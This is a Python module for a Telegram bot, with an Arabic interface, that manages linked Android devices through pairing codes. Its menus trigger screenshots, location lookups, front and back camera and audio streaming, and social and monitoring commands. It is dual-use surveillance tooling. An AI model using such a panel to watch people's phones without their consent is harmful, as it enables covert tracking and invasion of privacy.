"""
Telegram Bot Module - Multi-user system with per-user isolation.
Each Telegram user gets their own session with isolated devices, files, commands.
"""

import asyncio
import json
import time
import logging
import urllib.parse
from typing import Optional
from datetime import datetime

from aiohttp import ClientSession, ClientTimeout, FormData

from .config import (
    BOT_TOKEN, ADMIN_CHAT_ID, TG_RATE_LIMIT, TG_DEDUP_SECONDS,
    SERVER_DOMAIN, VERSION
)
from .store import store
from .commands import COMMAND_REGISTRY, CMD_CATEGORIES, get_commands_by_category
from . import firebase_client as _fb

logger = logging.getLogger("telegram")

API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
_tg_session: ClientSession = None
polling_active = False
tg_offset = 0

# Bot username (fetched dynamically via getMe on startup; used to build
# deep-link URLs for account linking: https://t.me/<bot_username>?start=<token>).
bot_username: Optional[str] = None


async def init_session():
    global _tg_session
    if _tg_session is None or _tg_session.closed:
        _tg_session = ClientSession(timeout=ClientTimeout(total=30))


async def close():
    global _tg_session
    if _tg_session and not _tg_session.closed:
        await _tg_session.close()


def get_bot_username() -> Optional[str]:
    """Return the cached bot username (or None if not yet fetched)."""
    return bot_username


def build_deep_link_url(token: str) -> Optional[str]:
    """Construct a Telegram deep-link URL: https://t.me/<bot>?start=<token>.

    Returns None if bot_username is not yet known.
    """
    if not bot_username:
        return None
    return f"https://t.me/{bot_username}?start={token}"


# ─── Telegram API Helpers ─────────────────────────────────────

async def api_call(method: str, payload: dict = None, timeout: int = 30) -> dict:
    """Make a Telegram Bot API call."""
    await init_session()
    url = f"{API_BASE}/{method}"
    try:
        async with _tg_session.post(url, json=payload or {}, timeout=ClientTimeout(total=timeout)) as resp:
            result = await resp.json()
            if not result.get('ok'):
                logger.error(f"TG API error: {method} -> {result}")
            return result
    except Exception as e:
        logger.error(f"TG API call failed: {method} -> {e}")
        return {"ok": False, "description": str(e)}


async def send_message(chat_id: str, text: str, parse_mode: str = "HTML",
                       reply_markup: dict = None, reply_to_message_id: int = None) -> dict:
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
        "disable_web_page_preview": True,
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    if reply_to_message_id:
        payload["reply_to_message_id"] = reply_to_message_id
    result = await api_call("sendMessage", payload)
    store.messages_sent += 1
    return result


async def send_photo(chat_id: str, photo_data: bytes, caption: str = "", reply_markup: dict = None) -> dict:
    await init_session()
    url = f"{API_BASE}/sendPhoto"
    data = FormData()
    data.add_field("chat_id", str(chat_id))
    data.add_field("photo", photo_data, filename="photo.jpg", content_type="image/jpeg")
    if caption:
        data.add_field("caption", caption, content_type="text/plain")
    if reply_markup:
        data.add_field("reply_markup", json.dumps(reply_markup), content_type="application/json")
    try:
        async with _tg_session.post(url, data=data, timeout=ClientTimeout(total=60)) as resp:
            result = await resp.json()
            store.messages_sent += 1
            return result
    except Exception as e:
        logger.error(f"TG send_photo failed: {e}")
        return {"ok": False}


async def send_document(chat_id: str, file_data: bytes, filename: str = "file", caption: str = "") -> dict:
    await init_session()
    url = f"{API_BASE}/sendDocument"
    data = FormData()
    data.add_field("chat_id", str(chat_id))
    data.add_field("document", file_data, filename=filename)
    if caption:
        data.add_field("caption", caption)
    try:
        async with _tg_session.post(url, data=data, timeout=ClientTimeout(total=120)) as resp:
            result = await resp.json()
            store.messages_sent += 1
            return result
    except Exception as e:
        logger.error(f"TG send_document failed: {e}")
        return {"ok": False}


async def answer_callback_query(callback_query_id: str, text: str = "", show_alert: bool = False):
    await api_call("answerCallbackQuery", {
        "callback_query_id": callback_query_id,
        "text": text,
        "show_alert": show_alert,
    })


# ─── User Session Management (Multi-User) ─────────────────────

def get_or_create_tg_session(chat_id: str) -> dict:
    """Get or create an isolated Telegram user session.

    Returns the session dict. The caller is responsible for calling
    `await store.save_tg_sessions()` when an authentication-state mutation
    happens (login, logout, link account, selected_device change). We do NOT
    persist here on every get/create to avoid excessive disk I/O for plain
    menu navigation.
    """
    # Normalise chat_id to string for consistent dict keys + JSON keys.
    chat_id = str(chat_id)
    if chat_id not in store.tg_sessions:
        store.tg_sessions[chat_id] = {
            "chat_id": chat_id,
            "authenticated": False,
            "user_id": None,
            "selected_device": None,
            "current_menu": "main",
            "created_at": datetime.utcnow().isoformat(),
            "last_activity": time.time(),
        }
    store.tg_sessions[chat_id]["last_activity"] = time.time()
    return store.tg_sessions[chat_id]


async def _persist_tg_session(chat_id: str) -> None:
    """Persist TG sessions after an auth-state mutation. Best-effort: swallows
    errors so message handling isn't broken by a disk hiccup.
    """
    try:
        await store.save_tg_sessions()
    except Exception as e:
        logger.warning(f"Failed to persist TG session for chat {chat_id}: {e}")


def get_user_for_tg(chat_id: str) -> Optional[dict]:
    """Get the user associated with a Telegram chat."""
    session = store.tg_sessions.get(chat_id)
    if session and session.get("user_id"):
        return store.users.get(session["user_id"])
    return None


def get_devices_for_tg(chat_id: str) -> list:
    """Get devices accessible by this Telegram user."""
    session = store.tg_sessions.get(chat_id)
    if not session:
        return []
    user_id = session.get("user_id")
    if not user_id:
        # Unauthenticated users see nothing
        return []
    user = store.users.get(user_id)
    if not user:
        return []
    if user.get("role") == "admin":
        return list(store.devices.values())
    return [d for d in store.devices.values() if d.get("owner_id") == user_id]


# ─── Authentication ──────────────────────────────────────────

async def authenticate_tg_user(chat_id: str, username: str, password: str) -> bool:
    """Authenticate a Telegram user with their platform credentials.

    On successful auth the session is persisted to disk so the user stays
    logged in across server restarts.
    """
    user = await store.authenticate_user(username, password)
    if user:
        session = get_or_create_tg_session(chat_id)
        session["authenticated"] = True
        session["user_id"] = user["id"]
        await _persist_tg_session(chat_id)
        return True
    return False


async def link_tg_chat_to_user(chat_id: str, user_id: str) -> bool:
    """Link a Telegram chat to a web user account via deep-link token.

    Used by the `/start <token>` flow. Persists the session so the link
    survives restarts. Returns True on success.
    """
    user = store.users.get(user_id)
    if not user:
        return False
    session = get_or_create_tg_session(chat_id)
    session["authenticated"] = True
    session["user_id"] = user_id
    session["linked_at"] = datetime.utcnow().isoformat()
    await _persist_tg_session(chat_id)
    return True


# ─── Keyboard Builders ────────────────────────────────────────

def inline_keyboard(buttons: list) -> dict:
    """Build inline keyboard markup. buttons is list of rows, each row is list of [text, callback_data]."""
    return {
        "inline_keyboard": [
            [{"text": text, "callback_data": data} for text, data in row]
            for row in buttons
        ]
    }


def main_menu_keyboard(chat_id: str) -> dict:
    """Main menu mirroring the web dashboard sidebar.

    Web dashboard views: overview, devices, commands, results, streaming,
    files, events, users (admin), settings. The bot exposes the same set as
    inline buttons (with commands/results/streaming gated on a selected
    device, and users gated on admin role).
    """
    session = get_or_create_tg_session(chat_id)
    is_auth = session.get("authenticated", False)

    if is_auth:
        user = get_user_for_tg(chat_id)
        devices = get_devices_for_tg(chat_id)
        online_count = sum(1 for d in devices if store._device_last_online.get(d['id'], False))
        selected = session.get("selected_device")
        is_admin = user.get('role') == 'admin' if user else False

        buttons = [
            # Row 1: Overview (mirrors sidebar «لوحة المعلومات»)
            [("📊 لوحة المعلومات", "view_overview")],
            # Row 2: Devices + Commands (commands require a selected device)
            [(
                f"📱 الأجهزة ({len(devices)} - {online_count} متصل)",
                "menu_devices"
            ), ("🎮 الأوامر", "menu_commands" if selected else "menu_devices")],
            # Row 3: Results + Streaming (both query the selected device)
            [("✅ النتائج", "view_results"), ("📡 البث", "view_streaming")],
            # Row 4: Files + Events (no device required)
            [("📁 الملفات", "view_files"), ("📋 الأحداث", "view_events")],
            # Row 5: Users (admin only) + Settings
            [("👥 المستخدمين" if is_admin else "📊 الإحصائيات",
              "view_users" if is_admin else "srv_stats"),
             ("⚙️ الإعدادات", "srv_settings")],
            # Row 6: Server status + Link device
            [("📡 حالة الخادم", "srv_status"), ("🔗 ربط جهاز", "do_link")],
        ]
    else:
        buttons = [
            [("🔐 تسجيل الدخول", "do_login")],
            [("📡 حالة الخادم", "srv_status")],
        ]

    return inline_keyboard(buttons)


def device_list_keyboard(chat_id: str) -> dict:
    devices = get_devices_for_tg(chat_id)
    if not devices:
        return inline_keyboard([[("لا توجد أجهزة", "back_main")]])
    
    buttons = []
    for dev in devices[:10]:  # Max 10 devices
        online = store._device_last_online.get(dev['id'], False)
        status = "🟢" if online else "🔴"
        name = dev.get('name', dev['model'])[:20]
        buttons.append([(
            f"{status} {name}",
            f"dev_{dev['id']}"
        )])
    buttons.append([("🔙 رجوع", "back_main")])
    return inline_keyboard(buttons)


def device_menu_keyboard(device_id: str) -> dict:
    """Device menu exposing ALL 8 command categories (parity with commands.py
    CMD_CATEGORIES) plus quick actions, streaming start/stop, and unlink."""
    buttons = [
        # Quick actions row
        [("📸 لقطة شاشة", f"quick_screenshot_{device_id}"),
         ("📍 الموقع", f"quick_location_{device_id}"),
         ("🔋 البطارية", f"quick_battery_{device_id}")],
        # All 8 categories (mirrors CMD_CATEGORIES in commands.py)
        [("📊 البيانات", f"submenu_data_{device_id}"),
         ("💬 التواصل", f"submenu_social_{device_id}")],
        [("🎮 التحكم", f"submenu_control_{device_id}"),
         ("📱 التطبيقات", f"submenu_apps_{device_id}")],
        [("📁 الملفات", f"submenu_files_{device_id}"),
         ("🔒 الأمان", f"submenu_security_{device_id}")],
        [("🔍 المراقبة", f"submenu_monitor_{device_id}"),
         ("📡 البث المباشر", f"submenu_streaming_{device_id}")],
        # Device management
        [("🔗 فك الربط", f"do_unlink_{device_id}")],
        [("🔙 رجوع", "menu_devices")],
    ]
    return inline_keyboard(buttons)


def category_commands_keyboard(category: str, device_id: str) -> dict:
    cmds = get_commands_by_category(category)
    cat_info = CMD_CATEGORIES.get(category, {})
    cat_name = cat_info.get('name', category)
    
    buttons = [[(f"📂 {cat_name}", "noop")]]  # Header
    
    row = []
    for key, cmd_def in cmds.items():
        btn_text = f"{cmd_def.get('icon', '')} {cmd_def.get('name', key)}"
        row.append((btn_text, f"exec_{key}_{device_id}"))
        if len(row) == 2:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)
    
    buttons.append([("🔙 رجوع", f"dev_{device_id}")])
    return inline_keyboard(buttons)


def quick_actions_keyboard(device_id: str) -> dict:
    buttons = [
        [("📸 لقطة شاشة", f"quick_screenshot_{device_id}"),
         ("📍 الموقع", f"quick_location_{device_id}")],
        [("🔋 البطارية", f"quick_battery_{device_id}"),
         ("ℹ️ معلومات", f"exec_info_{device_id}")],
        [("📱 التطبيقات", f"exec_installed_apps_{device_id}"),
         ("📶 WiFi", f"exec_wifi_info_{device_id}")],
        [("🔙 رجوع", f"dev_{device_id}")],
    ]
    return inline_keyboard(buttons)


def command_category_picker(device_id: str) -> dict:
    buttons = []
    for cat_id, cat_info in CMD_CATEGORIES.items():
        cmds = get_commands_by_category(cat_id)
        if cmds:
            buttons.append([(
                f"{cat_info['icon']} {cat_info['name']} ({len(cmds)})",
                f"submenu_{cat_id}_{device_id}"
            )])
    buttons.append([("🔙 رجوع", f"dev_{device_id}")])
    return inline_keyboard(buttons)


def streaming_keyboard(device_id: str) -> dict:
    """Inline keyboard for streaming start/stop/frame controls.
    Mirrors the web dashboard's streaming-viewer.tsx (3 video types + audio).
    """
    buttons = [
        [("🖥️ بث الشاشة", f"stream_start_screen_{device_id}"),
         ("⏹️ إيقاف الشاشة", f"stream_stop_screen_{device_id}")],
        [("🤳 الكاميرا الأمامية", f"stream_start_front_{device_id}"),
         ("📷 الكاميرا الخلفية", f"stream_start_back_{device_id}")],
        [("⏹️ إيقاف الكاميرا", f"stream_stop_front_{device_id}")],
        [("🎙️ بث الصوت", f"stream_start_audio_{device_id}"),
         ("⏹️ إيقاف الصوت", f"stream_stop_audio_{device_id}")],
        [("📸 لقطة من البث", f"stream_frame_{device_id}")],
        [("⛔ إيقاف كل البث", f"stream_stop_all_{device_id}")],
        [("🔙 رجوع", f"dev_{device_id}")],
    ]
    return inline_keyboard(buttons)


def _parse_stream_callback(rest: str) -> tuple:
    """Parse the suffix of a stream_* callback into (stream_type, device_id).

    Format: <type>_<device_id> where type ∈ {screen, front, back, audio, all}.
    The type token has no underscores, so a single split works.
    """
    if "_" not in rest:
        return (None, None)
    stream_type, device_id = rest.split("_", 1)
    return (stream_type, device_id)


# ─── Message Handlers ─────────────────────────────────────────

async def handle_message(chat_id: str, text: str, message_id: int, from_user: dict):
    """Handle incoming Telegram text messages."""
    text = text.strip()
    session = get_or_create_tg_session(chat_id)

    # Dedup
    dedup_key = f"{chat_id}:{message_id}"
    if dedup_key in store._tg_processed_messages:
        return
    store._tg_processed_messages.add(dedup_key)
    if len(store._tg_processed_messages) > 200:
        store._tg_processed_messages = set(list(store._tg_processed_messages)[-100:])

    # Rate limit
    if not store.check_rate_limit(f"tg_chat_{chat_id}", TG_RATE_LIMIT, 30):
        await send_message(chat_id, "⏳ أنت ترسل رسائل بسرعة كبيرة. انتظر قليلاً.")
        return

    # ─── Deep-link account linking via /start <token> ─────────
    # This is checked BEFORE the authentication gate because the whole point is
    # to let an unauthenticated user link their chat to a web account by
    # opening a t.me/<bot>?start=<token> deep-link generated on the dashboard.
    if text.startswith("/start"):
        parts = text.split(None, 1)
        token_arg = parts[1].strip() if len(parts) == 2 else ""
        if token_arg:
            await handle_start_token(chat_id, token_arg, session)
            return

    # Handle authentication state
    if not session.get("authenticated"):
        await handle_unauthenticated(chat_id, text, session)
        return

    # Handle commands
    if text.startswith("/"):
        cmd = text.split()[0].lower()
        await handle_command(chat_id, cmd, text, session)
    else:
        await send_message(chat_id, "استخدم الأزرار أدناه أو الأوامر المتاحة.\n"
                         "أرسل /help لعرض قائمة الأوامر.",
                         reply_markup=main_menu_keyboard(chat_id))


async def handle_start_token(chat_id: str, token: str, session: dict) -> None:
    """Handle the `/start <token>` deep-link flow.

    The token is a one-time, 10-minute token generated by the web dashboard
    (POST /api/web/tg_link_token). The server verifies it (no Telegram API
    call needed — the token lives in store.tg_link_tokens). On success the
    chat is linked to the user's account, the session is persisted, and a
    success message is sent. On failure an error message is sent.
    """
    token = token.strip()
    user_id = store.verify_tg_link_token(token)
    if not user_id:
        await send_message(chat_id,
            "❌ رابط الربط غير صالح أو منتهي الصلاحية.\n\n"
            "💡 يمكنك توليد رابط جديد من لوحة التحكم على الويب "
            "(زر «ربط بوت Telegram»)، أو تسجيل الدخول يدوياً بإرسال:\n"
            "<code>اسم_المستخدم كلمة_المرور</code>",
            reply_markup=inline_keyboard([[("🔐 تسجيل الدخول", "do_login")]]))
        return

    user = store.users.get(user_id)
    if not user:
        await send_message(chat_id,
            "❌ الحساب المرتبط بهذا الرابط غير موجود.",
            reply_markup=inline_keyboard([[("🔐 تسجيل الدخول", "do_login")]]))
        return

    ok = await link_tg_chat_to_user(chat_id, user_id)
    if not ok:
        await send_message(chat_id, "❌ تعذّر ربط الحساب. حاول مرة أخرى.")
        return

    await send_message(chat_id,
        f"✅ <b>تم ربط حسابك بنجاح!</b>\n\n"
        f"👤 المستخدم: <b>{user['username']}</b>\n"
        f"📧 البريد: {user['email']}\n"
        f"🆔 معرف المستخدم: <code>{user['id']}</code>\n\n"
        f"يمكنك الآن التحكم في أجهزتك من خلال هذا البوت. "
        f"أرسل /menu لعرض القائمة الرئيسية.",
        reply_markup=main_menu_keyboard(chat_id))


async def handle_unauthenticated(chat_id: str, text: str, session: dict):
    """Handle messages from unauthenticated Telegram users."""
    # Auto-authenticate admin chat
    if str(chat_id) == str(ADMIN_CHAT_ID):
        admin_user = None
        for u in store.users.values():
            if u.get('role') == 'admin':
                admin_user = u
                break
        if admin_user:
            session["authenticated"] = True
            session["user_id"] = admin_user["id"]
            await _persist_tg_session(chat_id)
            await send_message(chat_id, f"✅ مرحباً {admin_user['username']}!\n"
                             f"تم تسجيل الدخول تلقائياً كمسؤول.\n\n"
                             f"معرف المستخدم: <code>{admin_user['id']}</code>",
                             reply_markup=main_menu_keyboard(chat_id))
            return

    # Parse login attempt: "username password"
    parts = text.split(None, 1)
    if len(parts) == 2:
        username, password = parts
        if await authenticate_tg_user(chat_id, username, password):
            user = get_user_for_tg(chat_id)
            await send_message(chat_id, f"✅ تم تسجيل الدخول بنجاح!\n"
                             f"مرحباً {user['username']}!\n"
                             f"معرفك: <code>{user['id']}</code>\n"
                             f"البريد: {user['email']}",
                             reply_markup=main_menu_keyboard(chat_id))
        else:
            await send_message(chat_id, "❌ خطأ في اسم المستخدم أو كلمة المرور.\n"
                             "أرسل: <code>اسم_المستخدم كلمة_المرور</code>\n\n"
                             "💡 أو استخدم ربط الحساب عبر رابط deep-link من لوحة التحكم.")
        return

    await send_message(chat_id, "🔐 يجب تسجيل الدخول أولاً\n\n"
                     "الطريقة المُفضّلة: اربط حسابك عبر رابط deep-link من لوحة التحكم على الويب "
                     "(زر «ربط بوت Telegram»).\n\n"
                     "أو أرسل يدوياً: <code>اسم_المستخدم كلمة_المرور</code>\n\n"
                     "مثال:\n<code>admin admin</code>",
                     reply_markup=inline_keyboard([[("🔐 تسجيل الدخول", "do_login")]]))


async def handle_command(chat_id: str, cmd: str, full_text: str, session: dict):
    """Handle slash commands from authenticated users."""
    user = get_user_for_tg(chat_id)
    if not user:
        await handle_unauthenticated(chat_id, full_text, session)
        return
    
    args = full_text.split()[1:] if len(full_text.split()) > 1 else []
    devices = get_devices_for_tg(chat_id)
    
    if cmd == "/start":
        await send_message(chat_id,
            f"👋 مرحباً {user['username']}!\n\n"
            f"🤖 بوت أبو زهرا للإدارة\n"
            f"📌 الإصدار {VERSION}\n"
            f"🌐 {SERVER_DOMAIN}\n\n"
            f"استخدم الأزرار أدناه للتحكم في أجهزتك.",
            reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd == "/help":
        help_text = (
            "📖 <b>قائمة الأوامر</b>\n\n"
            "<b>التنقّل</b>\n"
            "/start - القائمة الرئيسية / ربط الحساب\n"
            "/menu - عرض القائمة\n"
            "/overview - لوحة المعلومات (نظرة عامة)\n\n"
            "<b>الأجهزة والأوامر</b>\n"
            "/devices - قائمة الأجهزة\n"
            "/search <بحث> - البحث في الأجهزة\n"
            "/results - نتائج الأوامر الأخيرة\n"
            "/streaming - إدارة البث المباشر\n\n"
            "<b>الملفات والأحداث</b>\n"
            "/files - الملفات المرفوعة\n"
            "/events - آخر الأحداث\n\n"
            "<b>الربط والإدارة</b>\n"
            "/link - كود الربط الخاص بك (دائم)\n"
            "/unlink <معرف_الجهاز> - فك الربط\n"
            "/users - المستخدمون (للمسؤول)\n\n"
            "<b>الخادم</b>\n"
            "/status - حالة الخادم\n"
            "/stats - الإحصائيات\n"
            "/logs - آخر السجلات\n"
            "/settings - الإعدادات\n\n"
            "يمكنك أيضاً التحكم مباشرة عبر الأزرار."
        )
        await send_message(chat_id, help_text, reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd == "/menu":
        await send_message(chat_id, "📋 القائمة الرئيسية:", reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd == "/devices":
        if not devices:
            await send_message(chat_id, "📱 لا توجد أجهزة مسجلة.\nاستخدم /link لإنشاء كود ربط.")
            return
        text = f"📱 <b>الأجهزة ({len(devices)})</b>\n\n"
        for dev in devices:
            online = store._device_last_online.get(dev['id'], False)
            status = "🟢 متصل" if online else "🔴 غير متصل"
            battery = dev.get('battery', 'N/A')
            text += f"{'🟢' if online else '🔴'} <code>{dev['id']}</code>\n"
            text += f"   {dev.get('model', 'Unknown')} | بطارية: {battery}% | {status}\n\n"
        await send_message(chat_id, text, reply_markup=device_list_keyboard(chat_id))
    
    elif cmd == "/link":
        # Lifelong permanent code (one per user, stored in Firebase as the
        # verification intermediary). NOT a short-lived pairing code.
        code = await store.get_or_create_permanent_code(user['id'])
        # Best-effort sync to Firebase so the Android client can verify against it.
        if _fb.firebase_connected:
            try:
                from .firebase_client import sync_permanent_code
                await sync_permanent_code(user['email'], code, user['id'])
            except Exception as e:
                logger.warning(f"Failed to sync permanent code to Firebase: {e}")
        await send_message(chat_id,
            f"🔗 <b>كود الربط الخاص بك</b>\n\n"
            f"<code>{code}</code>\n\n"
            f"♾️ هذا الكود صالح مدى الحياة — لا يحتاج للتجديد.\n"
            f"📱 أدخل هذا الكود في تطبيق الجهاز للربط.",
            reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd == "/unlink" and args:
        device_id = args[0]
        success = await store.unlink_device(device_id, user['id'])
        if success:
            # Clear selected_device if it was the unlinked one (state mutation).
            if session.get("selected_device") == device_id:
                session["selected_device"] = None
                await _persist_tg_session(chat_id)
            await send_message(chat_id, f"✅ تم فك ربط الجهاز {device_id}", reply_markup=main_menu_keyboard(chat_id))
        else:
            await send_message(chat_id, "❌ فشل فك الربط. تأكد من معرف الجهاز.")
    
    elif cmd == "/status":
        stats = store.get_stats()
        await send_message(chat_id,
            f"📡 <b>حالة الخادم</b>\n\n"
            f"✅ يعمل\n"
            f"⏱️ مدة التشغيل: {stats['uptime'] // 3600}س {stats['uptime'] % 3600 // 60}د\n"
            f"📱 أجهزة: {stats['devices_total']} ({stats['devices_online']} متصل)\n"
            f"🎮 أوامر معلقة: {stats['commands_pending']}\n"
            f"🔥 Firebase: {'متصل' if _fb.firebase_connected else 'غير متصل'}\n"
            f"📊 الإصدار: {VERSION}",
            reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd == "/stats":
        stats = store.get_stats()
        await send_message(chat_id,
            f"📊 <b>الإحصائيات</b>\n\n"
            f"📱 إجمالي الأجهزة: {stats['devices_total']}\n"
            f"🟢 متصل: {stats['devices_online']}\n"
            f"🔴 غير متصل: {stats['devices_offline']}\n"
            f"🎮 إجمالي الأوامر: {stats['commands_total']}\n"
            f"⏳ أوامر معلقة: {stats['commands_pending']}\n"
            f"✅ أوامر مكتملة: {stats['commands_completed']}\n"
            f"📋 الأحداث: {stats['events_count']}\n"
            f"📁 ملفات نشطة: {stats['files_active']}\n"
            f"📡 طلبات API: {stats['api_hits']}\n"
            f"💬 رسائل تيليجرام: {stats['messages_sent']}\n"
            f"👤 المستخدمون: {stats['users_total']}",
            reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd == "/logs":
        events = await store.get_events(limit=15)
        if not events:
            await send_message(chat_id, "📋 لا توجد سجلات.", reply_markup=main_menu_keyboard(chat_id))
            return
        text = "📋 <b>آخر السجلات</b>\n\n"
        for evt in events:
            icon = {"info": "ℹ️", "success": "✅", "warning": "⚠️", "error": "❌"}.get(evt.get('level', ''), "ℹ️")
            text += f"{icon} {evt.get('event', '')}\n"
            if evt.get('details'):
                text += f"   {evt['details'][:100]}\n"
        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd == "/settings":
        text = "⚙️ <b>الإعدادات</b>\n\n"
        for key, value in store.settings.items():
            text += f"• {key}: {value}\n"
        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd == "/search" and args:
        query = " ".join(args).lower()
        results = [d for d in devices if 
                   query in d.get('name', '').lower() or 
                   query in d.get('model', '').lower() or
                   query in d.get('id', '').lower()]
        if not results:
            await send_message(chat_id, "🔍 لم يتم العثور على نتائج.")
        else:
            text = f"🔍 <b>نتائج البحث ({len(results)})</b>\n\n"
            for dev in results:
                online = store._device_last_online.get(dev['id'], False)
                text += f"{'🟢' if online else '🔴'} <code>{dev['id']}</code> - {dev.get('model', '')}\n"
            await send_message(chat_id, text)

    elif cmd == "/overview":
        # Mirrors web dashboard's overview.tsx
        stats = store.get_stats()
        online_devices = [d for d in devices if store._device_last_online.get(d['id'], False)]
        text = (
            f"📊 <b>لوحة المعلومات</b>\n\n"
            f"🖥️ الخادم: ✅ يعمل | ⏱️ {stats['uptime'] // 3600}س {stats['uptime'] % 3600 // 60}د\n"
            f"🔥 Firebase: {'متصل' if _fb.firebase_connected else 'غير متصل'} | v{VERSION}\n\n"
            f"📱 <b>الأجهزة</b> ({stats['devices_total']})\n"
            f"   🟢 متصل: {stats['devices_online']} | 🔴 غير متصل: {stats['devices_offline']}\n\n"
            f"🎮 <b>الأوامر</b>\n"
            f"   الإجمالي: {stats['commands_total']}\n"
            f"   ✅ مكتملة: {stats['commands_completed']}\n"
            f"   ⏳ معلقة: {stats['commands_pending']}\n\n"
            f"📋 الأحداث: {stats['events_count']}\n"
            f"📁 ملفات نشطة: {stats['files_active']}\n"
            f"👤 المستخدمون: {stats['users_total']}\n"
        )
        if online_devices:
            text += "\n🟢 <b>الأجهزة المتصلة:</b>\n"
            for d in online_devices[:5]:
                text += f"   • {d.get('model', d['id'])}\n"
        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))

    elif cmd == "/results":
        # Mirrors web dashboard's command-results.tsx
        selected = session.get("selected_device")
        cmds = await store.get_commands_history(device_id=selected, limit=15)
        cmds = [c for c in cmds if c.get('status') in ('completed', 'failed')]
        if not cmds:
            await send_message(chat_id,
                "✅ <b>نتائج الأوامر</b>\n\nلا توجد نتائج بعد.",
                reply_markup=main_menu_keyboard(chat_id))
            return
        text = f"✅ <b>نتائج الأوامر ({len(cmds)})</b>\n\n"
        for c in cmds[:10]:
            status_icon = "✅" if c.get('status') == 'completed' else "❌"
            cmd_name = c.get('command', '')
            dev = store.devices.get(c.get('device_id', ''), {})
            dev_name = dev.get('model', c.get('device_id', '')[:8])
            result_preview = str(c.get('result', ''))[:80].replace('\n', ' ')
            text += f"{status_icon} <b>{cmd_name}</b> → {dev_name}\n"
            if result_preview:
                text += f"   <code>{result_preview}</code>\n"
        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))

    elif cmd == "/streaming":
        selected = session.get("selected_device")
        if not selected:
            await send_message(chat_id, "⚠️ اختر جهازاً أولاً.",
                             reply_markup=device_list_keyboard(chat_id))
            return
        device = store.devices.get(selected)
        if not device:
            await send_message(chat_id, "❌ الجهاز غير موجود.")
            return
        online = store._device_last_online.get(selected, False)
        status = "🟢 متصل" if online else "🔴 غير متصل"
        await send_message(chat_id,
            f"📡 <b>البث المباشر</b>\n\n"
            f"📱 الجهاز: {device.get('model', selected)}\n"
            f"📊 الحالة: {status}\n\n"
            f"اختر نوع البث:",
            reply_markup=streaming_keyboard(selected))

    elif cmd == "/files":
        # Mirrors web dashboard's file-viewer.tsx
        is_admin = user.get('role') == 'admin'
        files = []
        for fid, fmeta in store.files.items():
            dev = store.devices.get(fmeta.get('device_id', ''))
            if not dev:
                continue
            if is_admin or dev.get('owner_id') == user['id']:
                safe = dict(fmeta)
                safe['device_name'] = dev.get('model', dev['id'])
                files.append(safe)
        if not files:
            await send_message(chat_id,
                "📁 <b>الملفات</b>\n\nلا توجد ملفات مرفوعة.\n"
                "الملفات تُحذف تلقائياً بعد ساعة من رفعها.",
                reply_markup=main_menu_keyboard(chat_id))
            return
        text = f"📁 <b>الملفات ({len(files)})</b>\n\n"
        for f in files[:15]:
            icon = "📸" if f.get('file_type') == 'screenshot' else "🖼️" if f.get('file_type') == 'photo' else "📎"
            name = f.get('filename', 'unknown')[:30]
            size_kb = (f.get('size', 0) or 0) // 1024
            text += f"{icon} {name} ({size_kb} KB) — {f.get('device_name', '?')}\n"
        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))

    elif cmd == "/events":
        selected = session.get("selected_device")
        events = await store.get_events(device_id=selected, limit=15)
        if not events:
            await send_message(chat_id, "📋 لا توجد أحداث.",
                             reply_markup=main_menu_keyboard(chat_id))
            return
        text = f"📋 <b>آخر الأحداث ({len(events)})</b>\n\n"
        for evt in events[:10]:
            icon = {"info": "ℹ️", "success": "✅", "warning": "⚠️", "error": "❌"}.get(evt.get('level', ''), "ℹ️")
            text += f"{icon} {evt.get('event', '')[:80]}\n"
        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))

    elif cmd == "/users":
        if user.get('role') != 'admin':
            await send_message(chat_id, "⛔ هذه الميزة للمسؤول فقط.",
                             reply_markup=main_menu_keyboard(chat_id))
            return
        users = await store.list_users()
        text = f"👥 <b>المستخدمون ({len(users)})</b>\n\n"
        for u in users[:15]:
            role_icon = "👑" if u.get('role') == 'admin' else "👤"
            devices_count = sum(1 for d in store.devices.values() if d.get('owner_id') == u['id'])
            text += (f"{role_icon} <b>{u.get('username', '?')}</b> "
                     f"[{u.get('role', 'user')}]\n"
                     f"   📧 {u.get('email', '?')}\n"
                     f"   📱 {devices_count} جهاز\n"
                     f"   🆔 <code>{u['id']}</code>\n\n")
        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd in COMMAND_REGISTRY:
        # Direct command execution: /screenshot, /location, etc.
        if not session.get("selected_device"):
            await send_message(chat_id, "⚠️ اختر جهازاً أولاً من قائمة الأجهزة.",
                             reply_markup=device_list_keyboard(chat_id))
            return
        device_id = session["selected_device"]
        await execute_device_command(chat_id, cmd.lstrip("/"), device_id, user)
    
    else:
        await send_message(chat_id, "❓ أمر غير معروف. أرسل /help لعرض الأوامر.",
                         reply_markup=main_menu_keyboard(chat_id))


# ─── Callback Query Handlers ──────────────────────────────────

async def handle_callback(chat_id: str, callback_data: str, message_id: int):
    """Handle inline button presses.

    NOTE: ``message_id`` is actually the Telegram ``callback_query_id`` (the
    callback's unique identifier, used to dismiss the loading spinner via
    answerCallbackQuery). The parameter name is kept for backward compat.
    """
    session = get_or_create_tg_session(chat_id)
    user = get_user_for_tg(chat_id)

    # Unauthenticated actions
    if callback_data == "do_login":
        await answer_callback_query(callback_query_id=message_id, text="أرسل: اسم_المستخدم كلمة_المرور", show_alert=False)
        return

    if callback_data == "do_register":
        await send_message(chat_id, "📝 للتسجيل، تواصل مع المسؤول.")
        return

    if not session.get("authenticated") or not user:
        await answer_callback_query(callback_query_id=message_id, text="سجل دخولك أولاً", show_alert=True)
        return

    await answer_callback_query(callback_query_id=message_id)
    devices = get_devices_for_tg(chat_id)

    # ─── Navigation ────────────────────────────────────────────
    if callback_data == "back_main":
